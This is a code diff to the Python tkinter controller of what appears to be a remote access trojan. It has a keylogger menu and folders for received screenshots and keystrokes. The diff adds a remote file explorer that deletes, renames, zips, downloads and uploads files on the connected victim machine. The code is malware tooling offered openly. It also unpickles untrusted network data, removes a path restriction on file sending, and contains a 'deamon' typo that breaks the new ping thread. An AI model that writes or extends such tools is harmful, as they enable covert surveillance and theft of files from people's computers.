@@ -28,6 +28,7 @@ class App():
         self.selected_client = ['', '']
         self.socket = None
         self.client = None
+        self.pinging = False
         self.id = ''
         self.client_addr = ()
     
@@ -35,13 +36,11 @@ class App():
 
         self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
         #self.filemenu.add_command(label='New Connection', command=self.conn_manager)
-        self.filemenu.add_command(label='New Connection', command=lambda: threading.Thread(target=self.conn_manager, daemon=True).start())
-        self.filemenu.add_separator()
-        self.filemenu.add_command(label='Close Connection', command=self.close_conn)
+        self.filemenu.add_command(label='Manage Connections', command=lambda: threading.Thread(target=self.conn_manager, daemon=True).start())
         self.menu_bar.add_cascade(label='Connection', menu=self.filemenu)
 
         self.tools_menu = tk.Menu(self.menu_bar, tearoff=0)
-        self.tools_menu.add_command(label='File explorer', command=lambda: threading.Thread(target=self.file_explorer, daemon=True).start())
+        self.tools_menu.add_command(label='File Explorer', command=lambda: threading.Thread(target=self.file_explorer, daemon=True).start())
         self.tools_menu.add_command(label='Dashboard')
         
         self.keyloggermenu = tk.Menu(self.tools_menu, tearoff=0)
@@ -54,7 +53,7 @@ class App():
         self.menu_bar.add_cascade(label='Tools', menu=self.tools_menu)
 
         self.terminalmenu = tk.Menu(self.menu_bar, tearoff=0)
-        self.terminalmenu.add_command(label='Clear Terminal', command=self.clear_terminal)
+        self.terminalmenu.add_command(label='Clear Terminal')
         self.menu_bar.add_cascade(label='Terminal', menu=self.terminalmenu)
 
         self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
@@ -76,14 +75,6 @@ class App():
             root.geometry('600x400')
             explorer = FileExplorer(root)
             root.mainloop()
-        
-    def close_conn(self):
-        try:
-            self.log.add('connection and client closed')
-            self.client.close()
-            self.socket.close()
-        except:
-            pass
 
     def conn_manager(self):
         conn_manager_ = ConnMaker()
@@ -123,9 +114,17 @@ class App():
                     
         if self.client == None:
             self.log.add('unable to connect to client')
-        
-    def clear_terminal(self):
-        pass
+        else:
+            threading.Thread(target=self.ping, deamon=True).start()
+            
+    def ping(self):
+        data = pickle.dumps("Pinged")
+        while True:
+            if self.client != None and self.socket != None:
+                self.pinging = True
+                header, data = comm(self.client, "PING:len(data):PING", data)
+                self.pinging = False
+                time.sleep(8)
                 
 class CMD():
     def __init__(self, root):
@@ -191,8 +190,6 @@ class CMD():
         self.prevent_exit = True
         if not os.path.exists('ressources/received_files/'):
             os.makedirs('ressources/received_files/')
-        if not os.path.exists('ressources/send_files/'):
-            os.makedirs('ressources/send_files/')
         if not os.path.exists('ressources/received_screenshots/'):
             os.makedirs('ressources/received_screenshots/')
         if not os.path.exists('ressources/keylogger/'):
@@ -209,9 +206,7 @@ class CMD():
                 data = pickle.dumps(command)
                 if command.startswith('sendfile'):
                     try:
-                        path = command.split(' ')[1]
-                        if 'ressources/send_files/' not in path:
-                            path = f'ressources/send_files/{path}'
+                        path = command[9:]
                         with open(path, 'rb') as f:
                             data_ = f.read()
                         data = pickle.dumps((command, data_))
@@ -267,9 +262,10 @@ class CMD():
         
 class ConnMaker():
     def __init__(self):
+        app.log.add("opened connection manager ...")
         self.root = tk.Tk()
         self.root.title('Connection Manager')
-        self.root.geometry('300x400')
+        self.root.geometry('400x470')
         self.running = True
 
         self.max_clients = app.max_clients
@@ -278,6 +274,12 @@ class ConnMaker():
         self.ids = []
         self.timeout = app.timeout
         self.selected_client = ['', '']
+        
+        tk.Label(self.root, text='Current Client : ').pack()
+        tk.Label(self.root, text=str(app.client)).pack()
+        tk.Button(self.root, text="Close Client", command=self.close_client).pack()
+        
+        ttk.Separator(self.root, orient='horizontal').pack(fill='x', pady=10)
 
         tk.Button(self.root, text='Start Search', command=self.update_search).pack()
         self.conn_list = tk.Listbox(self.root, width=50, height=20)
@@ -285,6 +287,15 @@ class ConnMaker():
         tk.Button(self.root, text='Submit Connection', command=self.submit_client).pack()
 
         self.root.mainloop()
+
+    def close_client(self):
+        self.client = None
+        try:
+            header, data = comm(app.client, "CLOSE:CLOSE:CLOSE", b"CLOSE")
+            app.client.close()
+            app.socket.close()
+        except:
+            pass
 
     def submit_client(self):
         try:
@@ -300,6 +311,7 @@ class ConnMaker():
             print(2, 'error !')
 
     def update_search(self):
+        app.log.add("update search running ...")
         self.conn_list.delete(0, tk.END)
         self.clients = []
         self.ids = []
@@ -334,13 +346,13 @@ class ConnMaker():
             app.log.add(f'error while updating ListBox in update_search : {e}')
 
 class FileExplorer():
-    def __init__(self, master):
-        self.master = master
+    def __init__(self, root):
+        self.root = root
         self.create_widgets()
 
     def create_widgets(self):
         # Frame principale
-        self.main_frame = tk.Frame(self.master)
+        self.main_frame = tk.Frame(self.root)
         self.main_frame.pack(fill='both', expand=True)
 
         self.tree_frame = tk.Frame(self.main_frame)
@@ -354,12 +366,23 @@ class FileExplorer():
         self.tree.configure(yscrollcommand=scrollbar.set)
 
         self.tree.bind('<<TreeviewOpen>>', self.on_open)
+        
+        self.context_menu = self.create_context_menu()
+        
+        self.tree.bind("<Button-3>", self.show_context_menu)
 
         try:
             self.add_drives()
         except Exception as e:
             print('dede', e)
             app.log.add(f'error in file explorer : {e}')
+            
+    def show_context_menu(self, event):
+        selected_item = self.tree.identify_row(event.y)
+        if selected_item:
+            self.tree.selection_set(selected_item)
+            self.context_menu.post(event.x_root, event.y_root)
+
 
     def list_drives(self):
         drives = []
@@ -381,7 +404,7 @@ class FileExplorer():
             header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
             for name in data:
                 abspath = os.path.join(path, name)
-                data = pickle.dumps(f'isdir {abspath}')
+                data = pickle.dumps(f'isdir "{abspath}"')
                 header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                 isdir = data
                 icon = '📁' if isdir else '📄'
@@ -400,6 +423,180 @@ class FileExplorer():
                 self.tree.delete(first_child)
                 path = self.tree.item(selected, 'values')[0]
                 self.populate_node(selected, path)
+        self.root.lift()
+        self.root.focus_force()
+                
+    def create_context_menu(self):
+        context_menu = tk.Menu(self.root, tearoff=0)
+        context_menu.add_command(label="Delete", command=self.delete_item)
+        context_menu.add_command(label="Rename", command=self.rename_item)
+        context_menu.add_command(label="New Folder", command=self.create_new_folder)
+        context_menu.add_command(label="Copy", command=self.copy_item)
+        context_menu.add_command(label="Paste", command=self.paste_item)
+        context_menu.add_command(label="Properties", command=self.show_properties)
+        context_menu.add_command(label="Compress (ZIP)", command=self.compress_item)
+        context_menu.add_command(label="Extract (Unzip)", command=self.extract_item)
+        context_menu.add_command(label="Download", command=self.download_item)
+        context_menu.add_command(label="Upload", command=self.upload_item)
+        return context_menu
+    
+    def delete_item(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        
+        data = pickle.dumps(f'ispath "{path}"')
+        header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+        
+        if data:
+            try:
+                data = pickle.dumps(f'isdir "{path}"')
+                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                
+                if data:
+                    data = pickle.dumps(f'removedir "{path}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                else:
+                    data = pickle.dumps(f'removefile "{path}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                    
+                self.tree.delete(selected_item)
+            except Exception as e:
+                tk.messagebox.showerror("Error", f"Failed to delete : {e}")
+                
+    def rename_item(self):
+        selected_item = self.tree.selection()[0]
+        old_name = self.tree.item(selected_item, 'values')[0]
+        
+        new_name = tk.simpledialog.askstring("Rename", "Enter new name:", initialvalue=old_name)
+        if new_name:
+            try:
+
+                data = pickle.dumps(f'rename "{old_name}", "{new_name}"')
+                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                
+                new_path = os.path.join(os.path.dirname(old_name), new_name)
+                self.tree.item(selected_item, text=f"{new_name}", values=[new_path])
+            except Exception as e:
+                tk.messagebox.showerror("Error", f"Failed to rename: {e}")
+                
+    def create_new_folder(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        folder_name = tk.simpledialog.askstring("New Folder", "Enter folder name:")
+        if folder_name:
+            new_folder_path = os.path.join(path, folder_name)
+            try:
+                
+                data = pickle.dumps(f'makedirs "{new_folder_path}"')
+                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                
+                self.tree.insert(selected_item, 'end', text=f"📁 {folder_name}", values=[new_folder_path])
+            except Exception as e:
+                tk.messagebox.showerror("Error", f"Failed to create folder: {e}")
+                
+    def copy_item(self):
+        selected_item = self.tree.selection()[0]
+        self.copied_item = self.tree.item(selected_item, 'values')[0]
+        print(f"Copied {self.copied_item}")
+
+    def paste_item(self):
+        if hasattr(self, 'copied_item'):
+            selected_item = self.tree.selection()[0]
+            destination_path = self.tree.item(selected_item, 'values')[0]
+            try:
+                data = pickle.dumps(f'isdir "{self.copied_item}"')
+                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                
+                if data:
+                    destination_path = os.path.join(destination_path, os.path.basename(self.copied_item))
+                    
+                    data = pickle.dumps(f'copydir "{self.copied_item}" "{destination_path}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                else:
+                    data = pickle.dumps(f'copyfile "{self.copied_item}" "{destination_path}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                    
+                self.populate_node(selected_item, destination_path)
+            except Exception as e:
+                tk.messagebox.showerror("Error", f"Failed to paste: {e}")
+                
+    def show_properties(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        if os.path.exists(path): #COMM
+            size = os.path.getsize(path)
+            creation_time = os.path.getctime(path)
+            modified_time = os.path.getmtime(path)
+            
+            properties = f"Size: {size} bytes\nCreated: {time.ctime(creation_time)}\nModified: {time.ctime(modified_time)}"
+            tk.messagebox.showinfo("File Properties", properties)
+
+    def compress_item(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        data = pickle.dumps(f'isdir "{path}"')
+        header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+        
+        if data:
+            zip_name = tk.simpledialog.askstring("Compress", "Enter ZIP file name:")
+            if zip_name:
+                try:
+                    data = pickle.dumps(f'zip "{zip_name}" "{path}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                    
+                    tk.messagebox.showinfo("Success", f"Folder compressed to {zip_name}.zip")
+                except Exception as e:
+                    tk.messagebox.showerror("Error", f"Failed to compress folder: {e}")
+                    
+    def extract_item(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        if path.endswith(".zip"):
+            extraction_folder = tk.simpledialog.askstring("Extract", "Enter extraction folder:")
+            if extraction_folder:
+                try:
+                    data = pickle.dumps(f'unzip "{path}" "{extraction_folder}"')
+                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                    
+                    tk.messagebox.showinfo("Success", f"Extracted to {extraction_folder}")
+                    self.populate_node(selected_item, extraction_folder)
+                except Exception as e:
+                    tk.messagebox.showerror("Error", f"Failed to extract: {e}")
+
+                    
+    def download_item(self):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, 'values')[0]
+        
+        try:
+            data = pickle.dumps(f'getfile "{path}"')
+            header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+            with open(f'ressources/received_files/{header.split(":")[2]}', 'wb') as f:
+                f.write(data)
+            tk.messagebox.showinfo("Success", f"Downloaded {path} \nAt ressources/received_files")
+        except Exception as e:
+            tk.messagebox.showerror("Error", f"Failed to download: {e}")
+
+    def upload_item(self):
+        file_path = tk.filedialog.askopenfilename()
+        
+        if file_path:
+            try:
+                with open(file_path, 'rb') as f:
+                    data_ = f.read()
+                command = f'sendfile sended_file"{time.time()}"'
+                data = pickle.dumps((command, data_))
+                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
+                
+                tk.messagebox.showinfo("Success", f"Uploaded {file_path}")
+            except Exception as e:
+                tk.messagebox.showerror("Error", f"Failed to upload: {e}")
+
 
 class Log():
     def __init__(self):
@@ -428,6 +625,9 @@ class Log():
 
 def comm(client, header, data):
     try:
+        while app.pinging and not "PING" in header:
+            print("waiting for server to finish pinging ...")
+            time.sleep(0.5)
         client.send(header.encode())
         client.sendall(data)
         
@@ -441,6 +641,11 @@ def comm(client, header, data):
         data = pickle.loads(bytes_data)
         
         app.log.add('received header and data in comm function')
+        if header[0] == "ERROR":
+            print(header)
+        app.log.add(header)
+        if header[0] == "TEXT":
+            app.log.add(data)
         return header, data
     except Exception as e:
         app.log.add(f'error in comm function : {e}')
